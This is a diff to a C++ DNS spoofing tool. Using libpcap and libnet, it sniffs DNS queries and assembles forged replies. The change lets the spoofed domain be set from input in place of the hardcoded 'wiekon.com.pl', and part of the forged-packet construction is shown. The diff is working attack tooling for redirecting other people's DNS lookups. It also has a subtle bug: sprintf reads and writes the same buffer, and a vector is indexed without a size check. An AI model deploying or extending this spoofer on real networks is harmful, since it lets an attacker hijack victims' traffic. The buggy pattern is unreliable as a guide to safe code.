@@ -11,13 +11,21 @@ using std::for_each;
 using std::string;
 
 DnsSpoofer::DnsSpoofer() = default;
-vector<std::string> domain;
+vector<std::string> spoof_domain_segments;
+char spoof_domain_name[1024];
 
 void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes);
 vector<string> get_domain_name(const unsigned char *query_payload);
 
 void DnsSpoofer::start_spoofing(char *device, const vector<std::string> &inputDomain) {
-    domain = inputDomain;
+    spoof_domain_segments = inputDomain;
+
+    for(auto & segment : inputDomain) {
+        char tmp[1024] = "";
+        snprintf(tmp, sizeof tmp, "%c%s", (char)strlen(segment.c_str()), segment.c_str());
+        sprintf(spoof_domain_name, "%s%s", spoof_domain_name, tmp);
+    }
+
     struct bpf_program fp{};
     bpf_u_int32 netp, maskp;
     _errbuf = (char*)malloc(PCAP_ERRBUF_SIZE);
@@ -59,11 +67,8 @@ vector<string> get_domain_name(const unsigned char *query_payload) {
 
 void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes) {
 
-    cout << "xD" << endl;
-    //TODO: Move this to program config or args
-//    vector<string> spoof_target = domain;
-//    cout << spoof_target[0] << endl;
-    vector<string> spoof_target;
+    vector<string> spoof_target = spoof_domain_segments;
+    cout << spoof_target[0] << endl;
 
     auto incoming_ethernet_header = (struct ethhdr *) bytes;
     auto incoming_ip_header = (struct iphdr*)(bytes + sizeof(struct ethhdr));
@@ -103,17 +108,13 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
                 auto libnet_context = libnet_init(LIBNET_LINK, nullptr, err_buf);
 
                 //TODO: xD way there, just for tests
+
                 char payload[1024];
                 auto payload_s = snprintf(
                         payload,
                         sizeof payload,
-                        "%c%s%c%s%c%s%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c",
-                        (char)strlen("wiekon"),
-                        "wiekon",
-                        (char)strlen("com"),
-                        "com",
-                        (char)strlen("pl"),
-                        "pl",
+                        "%s%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c",
+                        spoof_domain_name,
                         0x00,
                         0x00,
                         0x01,
